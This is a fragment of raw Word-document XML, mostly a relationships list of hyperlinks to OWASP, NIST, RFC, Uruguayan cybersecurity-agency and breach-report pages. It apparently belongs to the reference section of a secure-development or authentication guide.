          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> · </w:t>
      </w:r>
      <w:hyperlink r:id="rId35">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">CERTuy</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:sectPr w:rsidR="00FC693F" w:rsidRPr="0006063C" w:rsidSect="00034616">
      <w:pgSz w:w="12240" w:h="15840"/>
      <w:pgMar w:top="1440" w:right="1224" w:bottom="144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hyperlink" Target="https://blog.gitguardian.com/the-state-of-secrets-sprawl-2026/" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.png"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html" TargetMode="External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hyperlink" Target="https://owasp.org/API-Security/editions/2023/en/0x11-t10/" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/projects/crapi" TargetMode="External"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/www-project-juice-shop/" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/web-security" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.png"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/www-project-web-security-testing-guide/" TargetMode="External"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://owasp.org/www-project-samm/" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cheatsheetseries.owasp.org/" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://pages.nist.gov/800-63-4/" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://csrc.nist.gov/pubs/sp/800/207/final" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://csrc.nist.gov/pubs/sp/800/61/r2/final" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.nist.gov/cyberframework" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.gub.uy/unidad-reguladora-control-datos-personales/" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/comunicacion/publicaciones/documentacion-tecnica-id-uruguay/documentacion-tecnica-id-uruguay/id-0" TargetMode="External"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc7009" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc2617" TargetMode="External"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc7616" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc6265" TargetMode="External"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc5849" TargetMode="External"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc6749" TargetMode="External"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc6750" TargetMode="External"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc6819" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc7519" TargetMode="External"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc7636" TargetMode="External"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc7662" TargetMode="External"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc8176" TargetMode="External"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc8252" TargetMode="External"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc8705" TargetMode="External"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc8725" TargetMode="External"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc9068" TargetMode="External"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc9449" TargetMode="External"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.rfc-editor.org/rfc/rfc9700" TargetMode="External"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://openid.net/specs/openid-connect-core-1_0.html" TargetMode="External"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/tematica/gestion-ciberseguridad" TargetMode="External"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://about.fb.com/news/2018/09/security-update/" TargetMode="External"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.cloudflare.com/how-cloudflare-mitigated-yet-another-okta-compromise/" TargetMode="External"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://about.codecov.io/security-update/" TargetMode="External"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.upguard.com/blog/what-caused-the-uber-data-breach" TargetMode="External"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/sites/agencia-gobierno-electronico-sociedad-informacion-conocimiento/files/Desarrollo%20seguro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